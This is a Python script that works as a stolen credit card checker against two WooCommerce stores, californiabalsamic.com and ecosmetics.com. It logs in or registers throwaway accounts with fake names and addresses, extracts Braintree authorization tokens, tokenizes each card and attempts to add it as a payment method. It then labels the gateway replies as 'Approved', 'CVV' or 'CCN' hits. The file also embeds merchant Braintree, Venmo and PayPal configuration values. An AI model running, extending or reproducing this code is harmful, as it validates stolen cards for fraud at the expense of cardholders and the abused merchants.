import requests
import re
import random
import time
import string
import base64
from requests import post,get,session;import random ,string ,re ,user_agent , base64,requests
import requests,time,re,user_agent
import random ,string ,re ,user_agent , base64,requests
from bs4 import BeautifulSoup
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	user = user_agent.generate_user_agent()
	r = requests.Session()
	r.follow_redirects = True
	r.verify = False

	all_mail=['gdiehdehr@gmail.com','vdhdjdhwbdb@gmail.com','vdhdksvdbkcsbdbid@gmail.com','gshfvvagwy@gmail.com','bbbbbdudhkdgjd@gmail.com','hdgejfsgdjwvdiwv@gmail.com','gegfidvdjdhsefde@gmail.com','vrjehejdvddbsdgfds@gmail.com','dvdhdjjsjfjdbdjdbe@gmail.com','hdvdjdbshdbdhdddfs@gmail.com','dgdgdjdshdjegs@gmail.com','jdvdksvdnd@gmail.com','wvvccauwjf@gmail.com','shhdhevsgwd@gmail.com','jdvdksvshsysss@gmail.com','egsshegebsy@gmail.com','ssshgwqqi@gmail.com','swhwgdiwghdw@gmail.com','jegdishhds@gmail.com','wdhwgdjwgxs@gmail.com','hdvdidsveje@gmail.com','jsjshsjshsgdjdh@gmail.com','sjdhdbshsgdnshsghdhdg@hssgshsh.com','nsjsjskshdjdhdbsdgdv@gmail.com','whehddhbes@gmail.com','ssvdjshsvhds@gmail.com','sywhshsgyddw@gmail.com','whdhhssbdb@gmail.com','kshdksbdbdhs@gmail.com','hdvdjsvdjsvjdb@gmail.com','swwkkdwqd@gmail.com','jdhskdgsbvdqq@gmail.com','hehehehhqq@gmail.com']
	mail=random.choice(all_mail)
	with open('fileb3.txt','r') as file:
			first=file.readline()
			try:
				all_mail.remove(first)
			except:
					pass
					mail=random.choice(all_mail)
					print(mail)
					with open('fileb3.txt','w') as file:
						file.write(mail)
			s=requests.session()
			s.headers={'user-agent':user}
			no=s.get('https://californiabalsamic.com/my-account/')
			login=re.findall(r'name="woocommerce-login-nonce" value="(.*?)"',no.text)[0]
			headers = {
	    'user-agent': user,
	}
			def find(ichi, ni='', san=''):
			     if ni in ichi:
				     yon = ichi.index(ni) + len(ni)
				     go = ichi[yon:len(ichi)]
				     roku = go.index(san)
				     if roku == 0:
				     	roku = len(go)
				     return go[0:roku]
			     else:
				     return ''
	data = {
	    'username': mail,
	    'password': 'ASDzxc#123#',
	    'woocommerce-login-nonce': login,
	    '_wp_http_referer': '/my-account/',
	    'login': 'Log in',
	}
	start_time = time.time()
	response = s.post('https://californiabalsamic.com/my-account/',headers=headers, data=data)
	s.get('https://californiabalsamic.com/my-account/payment-methods/')
	ao=s.get('https://californiabalsamic.com/my-account/add-payment-method/')
	op=ao.text
	enc=(find(op, 'var wc_braintree_client_token = ["', '"'))
	dec = base64.b64decode(enc).decode('utf-8')
	au=re.findall(r'"authorizationFingerprint":"(.*?)"',dec)[0]
	head = {
	    'authorization': f'Bearer {au}',
	    'content-type': 'application/json',
	    'braintree-version': '2018-05-10',
	    'user-agent': user
	}
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': 'fc4262a6-68d4-472d-a057-b7e8683dfcc4',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	                'billingAddress': {
	                    'postalCode': '11226',
	                    'streetAddress': '',
	                },
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	
	response = s.post('https://payments.braintree-api.com/graphql', json=json_data,headers=head)
	token=response.json()['data']['tokenizeCreditCard']['token']
	pay=re.findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"',op)[0]
	data = {
	    'payment_method': 'braintree_cc',
	    'braintree_cc_nonce_key': token,
	    'braintree_cc_device_data': '{"device_session_id":"fbfb7929dd4f59bfb1fc9a5cf9379135","fraud_merchant_id":null,"correlation_id":"9640e2960a259fefe16fcdde1ae8d0a6"}',
	    'braintree_cc_3ds_nonce_key': '',
	    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/h6nck7m2yyh6mqk4/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/h6nck7m2yyh6mqk4"},"merchantId":"h6nck7m2yyh6mqk4","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"h6nck7m2yyh6mqk4","supportedNetworks":["visa","mastercard","amex","discover"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"payWithVenmo":{"merchantId":"3333843690920608617","accessToken":"access_token$production$h6nck7m2yyh6mqk4$c17263feed9f66d5cc7e08f975927dd8","environment":"production","enrichedCustomerDataEnabled":false},"paypalEnabled":true,"paypal":{"displayName":"KBS Research","clientId":"AZ2WICgQ3fCYcNKRNgw9m3wd5_brlV542A4KeOL3mkkw11N4itXNyWxL_R7KGD0tX8Ssa3bEiyGG10gc","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"kbsresearch_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
	    'woocommerce-add-payment-method-nonce': pay,
	    '_wp_http_referer': '/my-account/add-payment-method/',
	    'woocommerce_add_payment_method': '1',
	}
	response = s.post('https://californiabalsamic.com/my-account/add-payment-method/',  data=data)
	text = response.text
	pattern = r'Reason: (.+?)\s*</li>'
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
	else:
		if 'Payment method successfully added.' in text:
			result = "1000: Approved"
		elif 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
		elif 'Please wait for 20 seconds.' in text:
			result = "try again"
		else:
			result = "Error"
			print('er#')
	if 'avs' in result or '1000: Approved' in result or 'Duplicate' in result or 'Insufficient Funds' in result:
		return 'Approved'
	else:
		return result
import os

try:
    import user_agent
    import requests
    import re
    import base64
    import random
    import string
except ImportError as e:
    print("حدث خطأ في استدعاء مكتبة:", e)
    print("يتم تثبيت المكتبات...")
    os.system('pip install pyfiglet user_agent requests')
    import user_agent
    import requests
    import re
    import base64
    import random
    import string

def sq(card):
	card = card.strip()
	parts = re.split('[:|]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]
		
	user = user_agent.generate_user_agent()
		
	r = requests.session()
	
	r.follow_redirects = True
	
	r.verify = False


		
	def generate_full_name():
			    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
			                   "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
			                   "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
			                   "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha",
			                   "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada",
			                   "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar",
			                   "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia",
			                   "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem",
			                   "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia",
			                   "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"] # List of first names
			    
			    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
			                   "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
			                   "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar",
			                   "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera",
			                   "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza",
			                   "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard",
			                   "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell",
			                   "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"] # List of last names
			    
			    full_name = random.choice(first_names) + " " + random.choice(last_names)
			    first_name, last_name = full_name.split()
			    
			    return first_name, last_name
			
	def generate_address():
			    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
			    states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
			    streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
			    zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]
			
			    city = random.choice(cities)
			    state = states[cities.index(city)]
			    street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
			    zip_code = zip_codes[states.index(state)]
			
			    return city, state, street_address, zip_code
			
			# Testing the library:
	first_name, last_name = generate_full_name()
	city, state, street_address, zip_code = generate_address()
			
			
			
			
			
	def generate_random_account():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=4))
				
		return f"{name}{number}@gmail.com"
	acc = (generate_random_account())
			
		
	def username():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=20))
				
		return f"{name}{number}"
	username = (username())
			
			
			
	def num():
		number = ''.join(random.choices(string.digits, k=7))
		return f"303{number}"
	num = (num())
			
			
	
	
	headers = {
	    'user-agent': user,
	}
	
	response = r.get('https://www.ecosmetics.com/my-account/', headers=headers)
	
	
	
	register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
	
	
	
	
	headers = {
	    'user-agent': user,
	}
	
	data = {
	    'email': acc,
	    'password': 'ASDzxc#123#',
	    'wc_order_attribution_source_type': 'typein',
	    'wc_order_attribution_referrer': 'https://www.ecosmetics.com/my-account/add-payment-method/',
	    'wc_order_attribution_utm_campaign': '(none)',
	    'wc_order_attribution_utm_source': '(direct)',
	    'wc_order_attribution_utm_medium': '(none)',
	    'wc_order_attribution_utm_content': '(none)',
	    'wc_order_attribution_utm_id': '(none)',
	    'wc_order_attribution_utm_term': '(none)',
	    'wc_order_attribution_utm_source_platform': '(none)',
	    'wc_order_attribution_utm_creative_format': '(none)',
	    'wc_order_attribution_utm_marketing_tactic': '(none)',
	    'wc_order_attribution_session_entry': 'https://www.ecosmetics.com/my-account/',
	    'wc_order_attribution_session_start_time': '2024-08-23 20:37:33',
	    'wc_order_attribution_session_pages': '4',
	    'wc_order_attribution_session_count': '1',
	    'wc_order_attribution_user_agent': user,
	    'woocommerce-register-nonce': register,
	    '_wp_http_referer': '/my-account/',
	    'register': 'Register',
	}
	
	response = r.post('https://www.ecosmetics.com/my-account/', headers=headers, data=data)
	
	headers = {
	    'user-agent': user,
	}
	
	response = r.get('https://www.ecosmetics.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers)
	
	address = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', response.text).group(1)
	
	
	headers = {
	    'user-agent': user,
	}
	
	data = {
	    'billing_first_name': first_name,
	    'billing_last_name': last_name,
	    'billing_company': '',
	    'billing_country': 'US',
	    'billing_address_1': street_address,
	    'billing_address_2': '',
	    'billing_city': city,
	    'billing_state': state,
	    'billing_postcode': zip_code,
	    'billing_phone': num,
	    'billing_email': acc,
	    'save_address': 'Save address',
	    'woocommerce-edit-address-nonce': address,
	    '_wp_http_referer': '/my-account/edit-address/billing/',
	    'action': 'edit_address',
	}
	
	response = r.post('https://www.ecosmetics.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers, data=data)
	
	
	
	headers = {
	    'user-agent': user,
	}
	
	response = r.get('https://www.ecosmetics.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
	
	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)

	enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
	dec = base64.b64decode(enc).decode('utf-8')
	au=re.findall(r'"authorizationFingerprint":"(.*?)"',dec)[0]	
		
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'authorization': f'Bearer {au}',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': user,
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': '39e4381c-82d1-4fec-bede-eb2d921842d5',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	                'billingAddress': {
	                    'postalCode': zip_code,
	                    'streetAddress': street_address,
	                },
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
		
	
	try:
		tok = response.json()['data']['tokenizeCreditCard']['token']
	except:
		return 	
	
	headers = {
	    'user-agent': user,
	}
	
	data = {
	    'payment_method': 'braintree_cc',
	    'braintree_cc_nonce_key': tok,
	    'braintree_cc_device_data': '{"device_session_id":"615f4c35cd937595d91300f78ad19256","fraud_merchant_id":null,"correlation_id":"fa5c64d8fe753e5db9ff5c3774bd3238"}',
	    'braintree_cc_3ds_nonce_key': '',
	    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/7dfb867dh9n7qcmq/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/7dfb867dh9n7qcmq"},"merchantId":"7dfb867dh9n7qcmq","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"7dfb867dh9n7qcmq","supportedNetworks":["visa","mastercard","amex","discover"]},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"eCosmetics","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjQ1MzI5NTcsImp0aSI6ImRlYjc4NTJiLTRmODEtNDBiMS05OGUzLTg3NGU0YjQxYzk1OSIsInN1YiI6IjdkZmI4NjdkaDluN3FjbXEiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjdkZmI4NjdkaDluN3FjbXEiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCJdLCJvcHRpb25zIjp7fX0.4rpigbUxagXLO_eEB8P12sxFQnDBbHm0JNKTmTMajWEr5qydo4bDCXjyefvw22WbuHAqh8xEm8AmjZ7_sXtvmg","paypalClientId":"AcC9_UON8FtbSW6e4tb11d8AADy6iNyKKiqPACrVBvVoGvdLtpSATU3EwLDLlfjoM5sHDLSb2iPuVNP5","supportedNetworks":["visa","mastercard","amex","discover"]},"paypalEnabled":true,"paypal":{"displayName":"eCosmetics","clientId":"AcC9_UON8FtbSW6e4tb11d8AADy6iNyKKiqPACrVBvVoGvdLtpSATU3EwLDLlfjoM5sHDLSb2iPuVNP5","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"ecosmetics_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
	    'woocommerce-add-payment-method-nonce': add_nonce,
	    '_wp_http_referer': '/my-account/add-payment-method/',
	    'woocommerce_add_payment_method': '1',
	}
	
	response = r.post('https://www.ecosmetics.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
				
	os.system('clear')
	text = response.text
	pattern = r'Reason: (.+?)\s*</li>'
	match = re.search(pattern, text)
	if match:
		kopi = match.group(1)
		if 'risk_threshold' in kopi:
			return "RISK: Retry this BIN later."
		elif 'You cannot add a new payment method so soon after the previous one' in kopi:
		    return "Please wait for 20 seconds."
		elif 'Nice! New payment method added' in kopi or 'Payment method successfully added.' in kopi:
		    return '1000: Approved'
		elif 'Duplicate card exists in the vault.' in kopi:
		    return 'Approved'
		elif "avs: Gateway Rejected: avs" in kopi or "avs_and_cvv: Gateway Rejected: avs_and_cvv" in kopi or "cvv: Gateway Rejected: cvv" in kopi:
		    return '1000: Approved'
		elif "Invalid postal code" in kopi or "CVV." in kopi:
		    return 'Approved (CVV)'
		elif "Card Issuer Declined CVV" in kopi:
		    return 'Approved (CCN)'
		else:
			return kopi
	else:
		if 'Payment method successfully added.' in text:
			return "1000: Approved"
		elif 'risk_threshold' in text:
			return "RISK: Retry this BIN later."
		elif 'Please wait for 20 seconds.' in text:
			return "try again"
		else:
			return 'Unknow Response'
